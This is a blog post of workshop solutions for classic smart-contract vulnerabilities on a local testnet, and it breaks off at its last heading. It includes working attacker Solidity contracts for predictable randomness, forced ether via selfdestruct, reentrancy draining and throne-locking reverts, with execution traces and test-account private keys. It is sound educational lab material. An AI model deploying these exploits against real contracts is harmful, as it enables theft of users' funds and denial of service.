---
layout: post
title:  "Cryptothingies workshop solutions"
date:	2024-04-28 20:36:09 +0200
author: foo
categories: workshop smart-contracts
ref: cryptothingies-workshop-solutions
---

This post is a companion to [the previous one](/post/workshop/smart-contracts/2024/04/28/cryptothingies-workshop.html).

Here, I will paste my notes with close to no curation, so be advised of their (probably) confusing contents.

The solutions were developed on a custom page with some JS to interact with the testnet deployed in the previous post.
After opening the page (technically, a DApp, as the cryptobros would say), the following UI is shown:

{% include image.html
	src="/assets/posts/2024-04-28-cryptothingies-workshop-solutions/Interface.png"
	title="Custom page to interact with the testnet"
	alt="A screenshot of the aforementioned webpage"
%}

It's advised to read the source code (which has plenty of documentation) and keep an eye on the browser's console, since many important messages are only shown via `console.log()`
You can access the (kinda unintentionally) hosted version [here](/assets/posts/2024-04-28-cryptothingies-workshop-solutions/vulns-explained.html), and get the source code from [the repo](https://github.com/Foo-Manroot/foo-manroot.github.io/blob/master/assets/posts/2024-04-28-cryptothingies-workshop-solutions/vulns-explained.html)


Table of Contents:
* Table of Contents
{:toc}


----

# Intro

Just as a quick note, all client-side JavaScript is executed within the context of a browser window with the following example HTML loaded:
```html
<html>
<head>
	<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
</head>
<body>
<script>
	const web3 = new Web3("http://192.168.0.22:8545");
	const attackerAddress = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
	const attackerPkey = "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"

	/* To generate some random traffic or simulate victims */
	const wallet_1 = {
		"addr": "0x2546bcd3c84621e976d8185a91a922ae77ecec30",
		"pkey": "0xea6c44ac03bff858b476bba40716402b03e41b8e97e276d1baec7c37d42484a0"
	};
	const wallet_2 = {
		"addr": "0xfabb0ac9d68b0b445fb7357272ff202c5651694a",
		"pkey": "0xa267530f49f8280200edf313ee7af6b827f2a8bce2897751d06a843f644967b1"
	};
</script>
</body>
</html>
```

<br/>
<br/>
<br/>

# Bad randomness

To setup this contract, we can just copy it to `/root/hardhat-testnet/contracts` and add it to the deploy script we already created on *intro and setup.md*:
```js
const contracts = [
	<...>
    {
      "name": "contracts/000-Bad randomness.sol:theRun",
      "constructor": (factory, args) => { return factory.deploy (); },
      "args": [ ],
      "verify": true
    }
]
```

There are some adjustments that must be done (it was written in solidity 0.4.0, and the lowest version supported by Hardhat is 0.5.0).
Namely:
  - change "constant" to "view" on the 10 functions that throw an error on compile (random, watchBalance, watchBalanceInEther, ...)
  - add a visibility (public, external, ...) to all functions, following the advise of the compiler
  - change the name of the constructor from "theRun" to "constructor"
  - change `if (fees == 0) throw` to `assert (fees == 0);` (line :125, inside `CollectAllFees`)
  - avoid _possible_ variable shadowing (according to the compiler warnings) on `NextPayout` (line :139 and :140, changing the arg to `arg` or smth), and `WatchWinningPot` (line :148 and :149)
  - change `send` to `transfer` on lines :42, :46, :77, :86, :126 and :133
  - change the data type of Player.addr (line :26), admin (:17), the argument "_owner" (:111) to `address payable`
  - remove the `constant` modifier on the definition of the sale (line :96)
   change `block.blockhash()` to just `blockhash()`
  - add the `payable` attribute to the fallback function, to be able to send a deposit
  - avoid a division by zero on line :101 by changing the divisor to `((salt % 5) + 1)`. This won't change the exploit behaviour, since the "random" number generator is still based on deterministic data
  - change line :102 so the random() function actually returns something other than "1" when there are less than a bazillion blocks ("seed" is always something like 1100000048330039909 or some shit). My take is to change that line to: `uint256 seed = block.number - (salt % 100) - (y % 100) - 1;`. This way, the seed will always end up being a block within the last 256 ones (otherwise, blockchash() returns 0)
		We need to create at least 256 dummy transactions first, though

Then, we can create some dummy transactions in the background to simulate other players placing bets (the minimum value to bet is 0.5 ETH, and the maximum is 20 ETH):
```js
const CTF00_ABI = [{"constant":true,"inputs":[],"name":"WatchFees","outputs":[{"name":"CollectedFees","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_owner","type":"address"}],"name":"ChangeOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"id","type":"uint256"}],"name":"PlayerInfo","outputs":[{"name":"Address","type":"address"},{"name":"Payout","type":"uint256"},{"name":"UserPaid","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"WatchWinningPot","outputs":[{"name":"pot","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"CollectAllFees","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"PayoutQueueSize","outputs":[{"name":"QueueSize","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"NextPayout","outputs":[{"name":"next","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"p","type":"uint256"}],"name":"GetAndReduceFeesByFraction","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"WatchLastPayout","outputs":[{"name":"payout","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"WatchBalance","outputs":[{"name":"TotalBalance","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"Total_of_Players","outputs":[{"name":"NumberOfPlayers","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"WatchBalanceInEther","outputs":[{"name":"TotalBalanceInEther","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":false,"stateMutability":"nonpayable","type":"fallback"}]
let CTF00_ADDR = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
let ctf00_contract = new web3.eth.Contract (CTF00_ABI, CTF00_ADDR);

/* For random() to not error out */
random_traffic (256);

function random_bet () {

    let CTF00_ADDR = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
    let wallet_1 = {
        "addr": "0xcd3B766CCDd6AE721141F452C550Ca635964ce71",
        "pkey": "0x8166f546bab6da521a8369cab06c5d2b9e46670292d85c875ee9ec20e84ffb61"
    };

    ctf00_contract.methods.NextPayout ().call ( (err, res) => {

    if (res) {
        console.log ("Last payout: " + web3.utils.fromWei (res) + " ETH");
    } else {
      console.log ("No payout yet");
    }
        let dummy_acc = web3.eth.accounts.create ();
        let value = web3.utils.toBN (
          res? res : web3.utils.toWei ("1", "ether")
        );
        console.log (value.toString ());

        web3.eth.accounts.signTransaction (
            {
                to: dummy_acc.address,
                gas: "30000",
                value: value.add (
                  web3.utils.BN ( web3.utils.BN ( web3.utils.toWei ("100", "finney") ) )
                )
            },
            wallet_1.pkey
        ).then (
            signed => web3.eth.sendSignedTransaction (signed.rawTransaction)
                .on ("receipt", _ => {
                    web3.eth.accounts.signTransaction (
                        {
                            to : CTF00_ADDR,
                            gas: "10000000",
                            value: value.add (
                                web3.utils.BN ( "1" )
                            )
                        },
                        dummy_acc.privateKey
                    ).then (
                        signed => { web3.eth.sendSignedTransaction(signed.rawTransaction).on ('receipt', console.log) }
                    );
                })
        );
    });
};
```


## Vulnerability explanation

This contract relies on a method that doesn't create proper random values (as everything in the blockchain is deterministic by design).
In this case, the following data is used to create a "random" number:
  - `block.timestamp` as a constant value stored on creation. This is the timestamp of the block that contained the contract's creation call
  - `Max` is an argument defined in the contract itself (100, as per line :75)
  - `block.number` is the number of the current block, when the `random()` function was called. This can be easily controlled if, for example, an attacker calls this contract from within another contract, so it's guaranteed that both calls end up in the same block.
  - `Last_Payout` is a variable that can be obtained by calling the `WatchLastPayout()` function of this contract (or by manually calculating it, observing the previous contract calls, which are recorded in the blockchain)
  - `blockhash(seed)` is the hash of the block defined by `seed`, assuming it's one of the last 256 available ones. Otherwise, returns 0. In any case, `seed` (the block number whose hash we want to calculate) is easy to precompute, since it depends on the deterministic inputs outlined above.

To gain the jackpot, an attacker can per-calculate these values and wait until the odds are favourable.

## Full exploit

Since calls from a smart contract to another one always end up in the same block, the values of block.number (or other attributes like that) are always guaranteed to be correct.
This is an example of attacker contract:
```js
pragma solidity ^0.5.0;

import "hardhat/console.sol";

contract VictimInterface {
    function NextPayout() public view returns(uint next) {}
}

contract Caller {

    address payable private originalAddress = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
    VictimInterface victim = VictimInterface (originalAddress);
    uint256 private salt = 0;

    address payable private admin;

    /* The salt can be obtained from web3.js with (assuming that 0x5d0... is the tx where the contract was created):
        web3.eth.getTransaction ("0x5d0b11d8cea2f32e20dc315ff1b4334a50cb789e66ab8e20133bd0bd9c64cdee").then (info => {
            web3.eth.getBlock (info.blockNumber).then (block => console.log (block.timestamp));
        });

        Or, in this test environment (since the victim contract is always in the first block):
        web3.eth.getBlock (1).then (block => console.log (block.timestamp));
    */
    constructor (uint256 contract_salt) payable public {
        admin = msg.sender;
        salt = contract_salt;
    }

    modifier onlyowner {if (msg.sender == admin) _;  }

    /* To receive the money after winning */
    function () external payable {
        console.log ("[ATTACKER] Called fallback");
        /* Send wins to the owner :) */
        admin.transfer (address(this).balance);
    }

    function play () public payable {

        //require (total_deposit > 1 ether, "total_deposit should be > 1 ether");  //only participation with more 1 ether is accepted by the victim
        console.log ("[ATTACKER] play()");
        uint roll = random (100);
        console.log ("[ATTACKER] dice roll: ");
        console.logUint (roll);
        console.logUint (salt);

        uint payout = victim.NextPayout ();
        console.log ("Next payout:");
        console.logUint (payout);

        if (roll % 10 == 0 ) {
            /* We won! -> play and send jackpot back to owner (it will get triggered after the victim pays back) */
            (bool success, bytes memory returnData) =  originalAddress.call.value (payout + 1).gas (500000)("");

            if (success) {
                console.log ("[ATTACKER] We won !!! (what a surprise XD)");
                console.logBytes (returnData);
            } else {
                console.log ("[ATTACKER] The winning transaction failed (?)");
            }
        }
    }

    /* Copied from theRun */
    function random (uint Max) view private returns (uint256 result) {
        console.log ("[ATTACKER] random()");
        //get the best seed for randomness
        uint256 x = salt * 100 / Max;
        uint256 y = salt * block.number / ((salt % 5) + 1) ; // Add "1" to avoid division by 0
//        uint256 seed = block.number/3 + (salt % 300) + Last_Payout +y;
        uint256 seed = block.number - (salt % 100) - (y % 100) - 1;
        uint256 h = uint256(blockhash(seed));

        console.log ("[ATTACKER] Salt (block.timestamp): ");
        console.logUint (salt);

        console.log ("[ATTACKER] block.number: ");
        console.logUint (block.number);

        console.log ("[ATTACKER] Max: ");
        console.logUint (Max);

        console.log ("[ATTACKER] y: ");
        console.logUint (y);

        console.log ("[ATTACKER] seed: ");
        console.logUint (seed);

        console.log ("[ATTACKER] block.blockhash (seed): ");
        console.logUint (h);

        return uint256((h / x)) % Max + 1;
    }
}
```

Whenever the attacker calls `play()`, the contract will evaluate whether betting now will win or not, and place a bet only when a win is guaranteed.
After several `play()` (but no actual bet, so no ETH lost besides the gas fees), this is the final `console.log` trace (the traces marked with "[ATTACKER]" come from the attacker; the rest, from the victim):
```
eth_sendTransaction
  Contract call:       Caller#play
  Transaction:         0xdce1ffaf00e1169d75169be75bbbd2656ed579a5eb2945090374e5750e804943
  From:                0x70997970c51812dc3a010c7d01b50e0d17dc79c8
  To:                  0x8464135c8f25da09e49bc8782676a84730c318bc
  Value:               1 wei
  Gas used:            171203 of 30000000
  Block #268:          0x46b04c003f4156cfd1b72903a7271a7437c1cecf5196bfe56f89d9f410406569

  console.log:
    [ATTACKER] play()
    [ATTACKER] random()
    [ATTACKER] Salt (block.timestamp):
    1667757710
    [ATTACKER] block.number:
    268
    [ATTACKER] Max:
    100
    [ATTACKER] y:
    446959066280
    [ATTACKER] seed:
    177
    [ATTACKER] block.blockhash (seed):
    4941499346153244964389669230970661844113584232471636265623074547810940469903
    [ATTACKER] dice roll:
    30
    1667757710
    [+] NextPayout()
    Next payout:
    1100000000000000001
    [!] Fallback function triggered
    [*] Inside init() -> msg.value:
    1100000000000000002
    Conditions were met
    [*] inside Participate()
    [*] WinningPot BEFORE update:
    30000000000000000
    [*] deposit:
    1100000000000000002
    [*]  (deposit * PotFrac):
    33000000000000000060
    [*] (deposit * PotFrac) / 1000:
    33000000000000000
    [*] WinningPot after update:
    63000000000000000
    [*] Payout_id:
    0
    [*] players [Payout_id].payout:
    1100000000000000001
    [?]  ( deposit > 1 ether ) ??
    true
    [?]  (deposit > players[Payout_id].payout) ??
    true
    [*] Entered random()
    [*] Salt (block.timestamp):
    1667757710
    [*] block.number:
    268
    [*] Max:
    100
    [*] y:
    446959066280
    [*] seed:
    177
    [*] block.blockhash (seed):
    4941499346153244964389669230970661844113584232471636265623074547810940469903
    [+] random() returned:
    30
    [!] WIN !!!
    [!] Transferring WinningPot to the winner's address:
    0x8464135c8f25da09e49bc8782676a84730c318bc
    [ATTACKER] Called fallback
    [ATTACKER] The winning transaction failed (?)

eth_getTransactionReceipt
```

<br/>
<br/>
<br/>

# Forced Ether Reception

Modifications for it to properly compile:
  - Change pragma (line :2) to `pragma solidity ^0.5.0;`
  - Set a correct constructor name on line :8, from `function owned() public {` to `constructor () {`. The same applies to lines :47 and :153
  - Add "public" access modifier to he function in line :179 (`function migrate_and_destroy() onlyOwner public {`)
  - Add `calldata` on the external call on line :22 (the parameter should end up looking like ` bytes calldata _extraData`)
        The parameter `_token` should also be changed to `TokenERC20 _token`
  - Add explicit memory allocation in memory  (i.e.: ` string memory tokenName`) on lines :48, :49, :129 (parameter `_extraData`), :154 and :155
  - Change comparison on line :60 and :160 to `require(_to != address (0x0) );`, so it's performed between the same data types (address)
  - Fix the way the balance is checked in line :180, to `assert( address(this).balance == totalSupply);`
        Change instances of the deprecated `suicide` opcode to `selfdestruct` (line :181)
  - Set the owner as an `address payable` type (line :6), and do the same with the arg `newOwner` on line :18)
  - Comment out a couple of lines to allow for transfers (idk why they were there in the first place, tbh...) The final `MyAdvancedToken._transfer()` should look like this:

```js
/* Internal transfer, only can be called by this contract */
function _transfer(address _from, address _to, uint _value) internal {
    require (_to != address (0x0) );                               // Prevent transfer to 0x0 address.
//        require (balanceOf[_from] >= _value);               // Check if the sender has enough
    require (balanceOf[_to] + _value >= balanceOf[_to]); // Check for overflows
//        require(!frozenAccount[_from]);                     // Check if sender is frozen
    require(!frozenAccount[_to]);                       // Check if recipient is frozen
//        balanceOf[_from] -= _value;                         // Subtract from the sender
    balanceOf[_to] += _value;                           // Add the same to the recipient
    emit Transfer(_from, _to, _value);
}
```

## Vulnerability explanation

**BEWARE: Blockscout sucks big ass and doesn't properly show destructed contracts**

To verify if a contract is really gone, use this (from the browser): `await web3.eth.getCode ("<the address of the contract>")`
If it returns simply `0x` (and nothing else), then it was properly destroyed

This contract is designed so anyone can exchange tokens for ether, with a 1-to-1 relationship.
So, whenever anyone calls the method `buy()` with 1 ETH, they get 1 TST token back.

At any moment, the owner can call the method `migrate_and_destroy()` to get all the ETH back and destroy the contract (usual when upgrading contracts to newer versions or whatever).
To verify, before calling `selfdestruct`, the contract checks that the current balance in ETH is the same as the amount of tokens issued.
If everything goes well, the transaction succeeds and the owner gets all that sweet sweet ether.

This check should never fail, because there's no other way to pay ether directly to the contract (if a regular transaction is issued, it gets rejected due to the lack of a `receive` or `fallback` functions)

However, a malicious smart contract could `selfdestruct` itself, which sends all funds to the target address without triggering any regular transfer, to force the victim to increase their balance, even if it's just 1 wei.
After this happens, the owner will never be able to call `migrate_and_destroy`, since the verification will always fail.

## Full exploit

This is the malicious smart contract:
```js
pragma solidity ^0.5.0;

import "hardhat/console.sol";

contract SelfDestructor {

    function attack (address payable targetAddress) payable public {
        selfdestruct (targetAddress);
    }
}
```

After buying a couple of tokens, before the admin pulls the balance, the attacker calls their contract's `attack ("<target contract>")`
`await web3.eth.getCode ("0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0")` reports now `"0x"`, so it was successful (Blockscout doesn't show any difference, not even the balance is updated)

When the admin tries to collect the money with `migrate_and_destroy`, this is the result (on hardhat):
```
eth_sendTransaction
  Contract call:       MyAdvancedToken#migrate_and_destroy
  Transaction:         0xa97320596281065e2f4cf2a6fe1b6923639d2ed263150f613021a95f395666cf
  From:                0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
  To:                  0xe7f1725e7734ce288f8367e1bb143e90bb3f0512
  Value:               0 ETH
  Gas used:            30000000 of 30000000
  Block #6:            0x8ef0745e0456680f97a6493c3ac5aaae90535618a01fb2bb1883ee55782f5490

  console.log:
    [MyAdvancedToken] migrate_and_destroy()
    [MyAdvancedToken] Current balance:
    101
    [MyAdvancedToken] Total supply:
    100

  Error: VM Exception while processing transaction: invalid opcode
      at MyAdvancedToken.migrate_and_destroy (contracts/001-Forced ether reception.sol:190)
      at HardhatNode._mineBlockWithPendingTxs (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:1773:23)
      at HardhatNode.mineBlock (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:466:16)
      at EthModule._sendTransactionAndReturnHash (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/modules/eth.ts:1504:18)
      at HardhatNetworkProvider._sendWithLogging (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:139:22)
      at HardhatNetworkProvider.request (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:116:18)
      at JsonRpcHandler._handleRequest (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/jsonrpc/handler.ts:188:20)
      at JsonRpcHandler._handleSingleRequest (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/jsonrpc/handler.ts:167:17)
```

New tokens can be bought, but the balance in ether will forever be lost XD

<br/>
<br/>
<br/>

# Incorrect Interface

Adjustments to compile:
  - Set visibility to `public` on all functions on Alice (lines :6 and :10) and Bob (lines :4, :5, :9 and :13)
  - Set the visibility of the fallback function to `external` on Alice (line :14)

## Vulnerability explanation

There is one contract, Bob, that wants to call a method on another one (Alice).
To do that, Bob needs to know Alice's interface (ABI), since the method is called using its encoded signature.
A function signature takes into account its name, parameters, and data types.

In this case, the contract Bob defines its Alice interface correctly, except that the data type for `set(uint)`, which should be `set(int)`, instead.

Therefore, when calling that nethod from Bob, Alice will receive a signature that she doesn't recogise, and will proceed to execute the fallback

## Full exploit

We just have to call `set` on Bob and observe the result:
```
  Contract call:       <UnrecognizedContract>
  Transaction:         0xede7321c04afc9fa1583c0009f357db143c61d7aec8e044a4725f4a43c66e065
  From:                0xdf3e18d64bc6a983f673ab319ccae4f1a57c7097
  To:                  0xcf7ed3acca5a467e9e704c703e8d87f634fb0fc9
  Value:               0 ETH
  Gas used:            50058 of 30000000
  Block #5:            0xb7cf91896e8cc65629b34f6ae396c2584ad89828e9949e22042e05abc58d4214

  console.log:
    [Alice] Fallback was called !!
```
And the new value of `val` is 1, as defined per the fallback (instead of 42, as we wanted)

<br/>
<br/>
<br/>

# Integer Overflow

Adjustments to compile:
  - Set visibility to `public` on all functions (lines :6 and :13)

## Vulnerability explanation

*Caveat*: [https://docs.soliditylang.org/en/v0.8.11/control-structures.html?highlight=unchecked#checked-or-unchecked-arithmetic](https://docs.soliditylang.org/en/v0.8.11/control-structures.html?highlight=unchecked#checked-or-unchecked-arithmetic):
  - Prior to Solidity 0.8.0, arithmetic operations would always wrap in case of under- or overflow leading to widespread use of libraries that introduce additional checks.
  - Since Solidity 0.8.0, all arithmetic operations revert on over- and underflow by default, thus making the use of these libraries unnecessary.
  - Before Solidity 0.8.0, integers (256-bit) were allowed to over- and underflow.

## Full exploit

In this instance, adding (2^256 - 1), to put it at the limit, and then adding plus 1 will overflow and the result will be again 0:
```
eth_sendTransaction
  Contract call:       Overflow#add
  Transaction:         0xd95e46fae2870615a780794c8afd240b0e08c8e8020567e6fb289b1dabc0a909
  From:                0xdf3e18d64bc6a983f673ab319ccae4f1a57c7097
  To:                  0xdc64a140aa3e981100a9beca4e685f962f0cf6c9
  Value:               0 ETH
  Gas used:            48928 of 30000000
  Block #40:           0xfca7119c9a557d268f1047cc4c7f3687d21cafa6ac14ef4eb9154623bcabd41f

  console.log:
    [Overflow] add() with arg:
    115792089237316195423570985008687907853269984665640564039457584007913129639935
    [Overflow.add] new sellerBalance:
    115792089237316195423570985008687907853269984665640564039457584007913129639935

eth_getTransactionReceipt
eth_getBlockByNumber (5)
eth_gasPrice
eth_sendTransaction
  Contract call:       Overflow#add
  Transaction:         0x343b0cd5b17b7239e12047426aa7c5baa1186c333e8a5bbb86eff639bda9a81e
  From:                0xdf3e18d64bc6a983f673ab319ccae4f1a57c7097
  To:                  0xdc64a140aa3e981100a9beca4e685f962f0cf6c9
  Value:               0 ETH
  Gas used:            26656 of 30000000
  Block #41:           0x7a1b9b40fb286ef7ad52ffd8325e80d2551bd5f352793c396e55e776578e5a36

  console.log:
    [Overflow] add() with arg:
    1
    [Overflow.add] new sellerBalance:
    0
```

<br/>
<br/>
<br/>

# Reentrancy

Changes to compile:
  - Change modifier of `getBalance` (line :6) from `constant` to `view`
  - Set visibility to `public` on all functions (lines :6, :10, :14, :23 and :33)
  - Change instances of `trhow` (lines :18 and :29) to `revert()`
  - Change lines :17 and :28 to the new form of calling, which goes a bit like this:

```js
(bool res, bytes memory _) = msg.sender.call.value (<whatever>)("")
if ( ! res ) {
    revert ();
}
```

## Vulnerability explanation

Whenever the victim's `withdrawBalance` is called, the contract _first_ performs the payment, and _then_ updates the internal balance.
However, since the destination of the payment can also be a contract itself, a malicious contract can use its fallback function (which will be triggered upon receiving any funds) to call the `withdrawBalance` function again

## Full exploit

This is the malicious contract:
```js
pragma solidity ^0.5.0;

import "hardhat/console.sol";

contract IVictim {

    function addToBalance() public payable;

    function withdrawBalance() public;
    function withdrawBalance_fixed() public;
    function withdrawBalance_fixed_2() public;
}

contract Attacker {

    IVictim victim_contract;
    int recursion_limit = 1;
    address payable owner;

    constructor (address victim_addr) public {

        victim_contract = IVictim (victim_addr);
        owner = msg.sender;
    }

    function addBooty () public payable {

        victim_contract.addToBalance.value (msg.value)();
    }

    function attack (int limit) public {

        recursion_limit = limit;

        console.log ("[Reentrancy-Attacker] started attack() with limit: ");
        console.logInt (limit);

        victim_contract.withdrawBalance ();
    }


    function () external payable {

        console.log ("[Reentrancy-Attacker] fallback. Current recursion_limit:");
        console.logInt (recursion_limit);

        if (recursion_limit > 0) {

            recursion_limit -= 1;
                console.log ("[Reentrancy-Attacker] calling the victim again...");
            victim_contract.withdrawBalance ();
        }
    }

    function get_money () public {
        require (msg.sender == owner);

        console.log ("[Reentrancy-Attacker] self-destructing and sending all funds back to owner:");
        console.logAddress (owner);

        selfdestruct (owner);
    }
}
```

After deploying it and creating some transactions with other accounts (whose ether is what we're trying to steal), we call `addBooty` to set the amount we want to steal on each recursion.
Then, when calling `attack(10)`, this is the result:
```
eth_sendTransaction
  Contract call:       <UnrecognizedContract>
  Transaction:         0xce7463ae25ca46310e1ce0921d4676e344bf5ff6c14a5b69ddf3e38428f1086e
  From:                0xdf3e18d64bc6a983f673ab319ccae4f1a57c7097
  To:                  0xa196769ca67f4903eca574f5e76e003071a4d84a
  Value:               0 ETH
  Gas used:            155117 of 30000000
  Block #12:           0x4fa5a891675a8dfc65ce98c334f60763f55d63230ace169f30766e150f0b8d08

  console.log:
    [Reentrancy-Attacker] started attack() with limit:
    10
    [Reentrancy] withdrawBalance()
    [Reentrancy-Attacker] fallback. Current recursion_limit:
    10
    [Reentrancy-Attacker] calling the victim again...
    [Reentrancy] withdrawBalance()
    [Reentrancy-Attacker] fallback. Current recursion_limit:
    9
    [Reentrancy-Attacker] calling the victim again...
    [Reentrancy] withdrawBalance()
    [Reentrancy-Attacker] fallback. Current recursion_limit:
    8
    [Reentrancy-Attacker] calling the victim again...
    [Reentrancy] withdrawBalance()
    [Reentrancy-Attacker] fallback. Current recursion_limit:
    7
    [Reentrancy-Attacker] calling the victim again...
    [Reentrancy] withdrawBalance()
    [Reentrancy-Attacker] fallback. Current recursion_limit:
    6
    [Reentrancy-Attacker] calling the victim again...
    [Reentrancy] withdrawBalance()
    [Reentrancy-Attacker] fallback. Current recursion_limit:
    5
    [Reentrancy-Attacker] calling the victim again...
    [Reentrancy] withdrawBalance()
    [Reentrancy-Attacker] fallback. Current recursion_limit:
    4
    [Reentrancy-Attacker] calling the victim again...
    [Reentrancy] withdrawBalance()
    [Reentrancy-Attacker] fallback. Current recursion_limit:
    3
    [Reentrancy-Attacker] calling the victim again...
    [Reentrancy] withdrawBalance()
    [Reentrancy-Attacker] fallback. Current recursion_limit:
    2
    [Reentrancy-Attacker] calling the victim again...
    [Reentrancy] withdrawBalance()
    [Reentrancy-Attacker] fallback. Current recursion_limit:
    1
    [Reentrancy-Attacker] calling the victim again...
    [Reentrancy] withdrawBalance()
    [Reentrancy-Attacker] fallback. Current recursion_limit:
    0
```

<br/>
<br/>
<br/>

# Unchecked External Call

Changes to compile:
  - Change `constant` modifier to `view` on line :76
  - Set visibility to `public` on all functions (lines :65, :76, :95, :161 and :166)
  - Set visibility to `external` on the fallback function (line :90)
  - Change the constructor name from `function KingOfTheEtherThrone() {` to `constructor () public {` (line :65)
  - Set data location to `memory` on line :95 (`function claimThrone (string memory name) public {`)
  - Change data type of `Monarch.etherAddress` (line :22), `wizardAddress` (line :34) and `newOwner` (line :166) to `address payable`
  - Add `emit` at the beggining of line :157, to use the new way of sending events (a `ThroneClaimed`, in this case)
  - Set as payable the function `function claimThrone (string memory name) public payable {`

## Vulnerability explanation

The original "vulnerability" probably refers to this: https://www.kingoftheether.com/postmortem.html (basically, someone used a wallet contract to claim the throne and, when dethroned, couldn't receive the refund)
It's not really a malicious exploit, but a programming error.

However, if we change all `send()`, which simply fails and continues, with a `transfer()`, which throws an exception, then shit starts to get interesting...
This, ironically, is the proposed solution from the "not-so-smart-contracts" team...

In this modified case, a malicious contract could claim the throne forever, by intentionally aborting the transactions before the new king/queen is claimed

## Full exploit

This malicious contract looks like this:
```js
pragma solidity ^0.5.0;

contract IVictim {

    function claimThrone (string memory name) public payable;
}

contract Attacker {

    IVictim victim_contract;

    constructor (address victim_addr) public {

        victim_contract = IVictim (victim_addr);
    }

    function attack () public payable {
        victim_contract.claimThrone.value (msg.value) ("Pwned!");
    }

    function () external payable {
        revert ("MUAHAHAHAHAHA");
    }
}
```

First, the contract (deployed in this case to 0x8464135c8F25Da09e49BC8782676a84730C318bC)  gets the throne after the attacker calling `attack()`:
```
  Contract call:       <UnrecognizedContract>
  Transaction:         0xd73070860c290a0f7feb32c2f741e3a6d3b6c6d8eb2b4c8dfabbbe325c79f8c5
  From:                0x70997970c51812dc3a010c7d01b50e0d17dc79c8
  To:                  0x8464135c8f25da09e49bc8782676a84730c318bc
  Value:               0.15 ETH
  Gas used:            178734 of 30000000
  Block #10:           0x783fb16906b661c6e0d631aec7fdf651e9890f533930f884281fc384650a1a1a

  console.log:
    [KOTE] claimThrone()
    [KOTE] Current claim pricce:
    150000000000000000
    [KOTE] Sending compenstaion to the previous monarch at address:
    0x70997970c51812dc3a010c7d01b50e0d17dc79c8
    [KOTE] Refund:
    148500000000000000
    [KOTE] Compensation done
    [KOTE] All done. New monarch:
    0x8464135c8f25da09e49bc8782676a84730c318bc
    [KOTE] New claim price:
    225000000000000000
```

Then, the next candidate wants to claim the throne and issues another transaction:
```
  Contract call:       <UnrecognizedContract>
  Transaction:         0x677525a4f76227943a655e155fefc33db968a8146f6ee05fb361c5dd862b8f56
  From:                0x70997970c51812dc3a010c7d01b50e0d17dc79c8
  To:                  0x0165878a594ca255338adfa4d48449f69242eb8f
  Value:               0.225 ETH
  Gas used:            45477 of 30000000
  Block #11:           0xc3add403e47a5fad72c11114982c25a50ddbcbb56cfdc4846318a9c4aa23ae91

  console.log:
    [KOTE] claimThrone()
    [KOTE] Current claim pricce:
    225000000000000000
    [KOTE] Sending compenstaion to the previous monarch at address:
    0x8464135c8f25da09e49bc8782676a84730c318bc
    [KOTE] Refund:
    222750000000000000

  Error: VM Exception while processing transaction: reverted with reason string 'MUAHAHAHAHAHA'
      at <UnrecognizedContract>.<unknown> (0x8464135c8f25da09e49bc8782676a84730c318bc)
      at <UnrecognizedContract>.<unknown> (0x0165878a594ca255338adfa4d48449f69242eb8f)
      at HardhatNode._mineBlockWithPendingTxs (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:1773:23)
      at HardhatNode.mineBlock (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/node.ts:466:16)
      at EthModule._sendTransactionAndReturnHash (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/modules/eth.ts:1504:18)
      at HardhatNetworkProvider._sendWithLogging (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:139:22)
      at HardhatNetworkProvider.request (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/provider/provider.ts:116:18)
      at JsonRpcHandler._handleRequest (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/jsonrpc/handler.ts:188:20)
      at JsonRpcHandler._handleSingleRequest (/root/hardhat-testnet/node_modules/hardhat/src/internal/hardhat-network/jsonrpc/handler.ts:167:17)
```
As can be seen by the stack trace above, the transaction fails before setting the new monarch.
This can be confirmed by checking `currentMonarch` on the victim's contract, which returns the following:
```json
{
	"etherAddress":"0x8464135c8F25Da09e49BC8782676a84730C318bC",
	"name":"Pwned!",
	"claimPrice":"150000000000000000"
}
```

This is kinda like the DoS issue, in the end...

<br/>
<br/>
<br/>

# Unprotected Function

Changes to compile:
  - Change constructor name (line :11) from `function Unprotected()` to `constructor()`

## Vulnerability explanation

